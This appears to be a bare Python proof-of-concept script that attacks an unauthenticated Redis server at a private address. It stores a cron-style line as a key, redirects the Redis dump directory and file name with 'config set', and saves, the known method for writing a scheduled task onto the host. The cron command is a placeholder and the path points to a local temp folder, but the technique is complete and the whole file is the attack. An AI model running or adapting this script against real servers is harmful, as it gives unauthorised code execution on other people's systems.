import socket

s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.settimeout(2)
x = s2.connect_ex(("192.168.0.160", 6379))
if x == 0:
    print("start writescript")
    s2.send(bytes('set backuper1 "\\n\\n\\n*/1 * * * * root ggggggggg\\n\\n\\n"\r\n', encoding = "utf8"))
    s2.send(bytes('config set dir f:\\temp\r\n', encoding = "utf8"))
    s2.send(bytes('config set dbfilename root\r\n', encoding = "utf8"))
    s2.send(bytes('save\r\n', encoding = "utf8"))
    while 1:
        accept_data = str(s2.recv(1024), encoding="utf8")
        print(accept_data)
s2.close()
